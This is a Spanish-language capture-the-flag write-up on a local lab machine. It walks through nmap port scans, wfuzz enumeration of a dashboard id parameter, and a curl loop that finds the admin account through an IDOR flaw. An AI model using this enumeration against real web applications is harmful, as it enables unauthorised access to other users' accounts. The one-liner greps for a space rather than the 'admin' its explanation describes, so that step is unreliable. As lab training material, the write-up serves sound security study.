tags: #facil #idor
____
## Reconocimiento

```bash
ping -c 1 172.17.0.2
```
  
![[Anexos/Pasted image 20251118194611.png]]

Estamos ante un sistema linux, así que seguimos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:

```bash
nmap -sS -p- -vvv -n -Pn --open --min-rate 5000 -oN ports 172.17.0.2
```

Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:

![[Anexos/Pasted image 20251118195108.png]]

Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:

```bash
nmap -sCV -p22,5000 -oN version -n -Pn 172.17.0.2
```

![[Anexos/Pasted image 20251118195144.png]]

Hay un servicio web corriendo por el puerto 5000, así que vamos a echar un vistazo:

![[Anexos/Pasted image 20251118232731.png]]

Vemos un panel de log-in que nos da la posibilidad de registrarnos, así que lo intentamos, con éxito. Ahora es momento de acceder con las credenciales que hemos elegido, en mi caso las siguientes:

```bash
Usuario: vic
Contraseña: tor
correo: vic@vic.com
```

![[Anexos/Pasted image 20251118232906.png]]

Nada más acceder ya vemos algo interesante en la URL: un id.
Esto es muy importante tenerlo en cuenta ya que si no está bien programado, existe la posibilidad de poder modificar libremente la id para acceder a usuarios, archivos, etc a los que no debería poder acceder.

Para explotar esto, vamos a iterar por un rango de **ids** para poder obtener información. Si nos damos cuenta, hay un patrón que es igual independientemente de qué id pongas, y es la parte en la que dice **Bienvenido, vic**
Si cambio la id de la URL por otra, sigue el mismo patrón:

![[Anexos/Pasted image 20251119001007.png]]

Visto esto, podemos intentar deducir que en el caso del usuario admin, lo llame por el usuario admin y no por el nombre real de una persona.

Con esta info, vamos a primero descubrir cuantos usuarios existen. Para ello vamos a crear un mini diccionario con los números del 1 al 500:

```bash
echo {1..500} | tr ' ' '\n' > range.txt
```

Ahora lo usaremos junto a la herramienta wfuzz para iterar por cada número dentro de la URL, usando el siguiente comando:

```bash
wfuzz -u http://172.17.0.2:5000/dashboard?id=FUZZ -w range.txt --hc=302 -f fuzz
```

Esto nos exporta el resultado en un archivo llamado simplemente fuzz usando el parámetro -f:

![[Anexos/Pasted image 20251119131120.png]]
![[Anexos/Pasted image 20251119001607.png]]

Como podemos ver, hay muchos usuarios y sabemos que en uno de ellos es posible que aparezca el título: **Bienvenido, admin**
Mediante el siguiente comando vamos a extraer únicamente el número del id convertido en un formato de fila y copiarlo a nuestra clipboard para construir nuestro comando:

```bash
cat fuzz | awk '{print $9}' | tr '"' ' ' | tr '\n' ' ' | xclip -sel clip
```

![[Anexos/Pasted image 20251119001829.png]]

Y por último, usando esos números, construimos un comando one-liner que nos itere por cada número dentro de la URL y nos diga si aparece alguno que arroje como resultado admin:

```bash
for id in 3 7 15 31 50 49 48 47 46 45 38 41 36 43 40 37 44 39 42 35 32 29 30 28 33 34 25 27 26 24 23 22 21 20 19 18 17 14 16 13 11 12 9 6 10 5 8 4 53 51 55 54 52; do curl -s "http://172.17.0.2:5000/dashboard?id=$id" | grep -iq " " && echo "[ADMIN ENCONTRADO] ID: $id - URL: http://172.17.0.2:5000/dashboard?id=$id"; done 
```

- **for id in 3 7 15 ... 52** - Crea un bucle que repite para cada número, cada número se guarda en la variable $id
- **do** - Indica el inicio del bloque de comandos que se repetirán
- **curl** - Hace petición HTTP a la URL
- **-s** - Modo silencioso, no muestra progreso ni errores
- **$id** - Sustituye el número actual en la URL
- **|** - Toma la salida de curl y la pasa al siguiente comando
- **grep** - Busca texto en la respuesta
- **-i** - Ignora mayúsculas/minúsculas (Admin = admin = ADMIN)
- **-q** - Modo silencioso, no imprime nada, solo devuelve true/false
- **"admin"** - Palabra a buscar
- **&&** - "Y" lógico, solo ejecuta lo siguiente SI grep encontró "admin"
- **echo** - Imprime mensaje en pantalla
- **done** - Indica el final del bucle

Al ejecutarlo, obtenemos lo siguiente:

![[Anexos/Pasted image 20251119002442.png]]

Ponemos el id 27 en la URL y somos el usuario admin:

![[Anexos/Pasted image 20251119130854.png]]


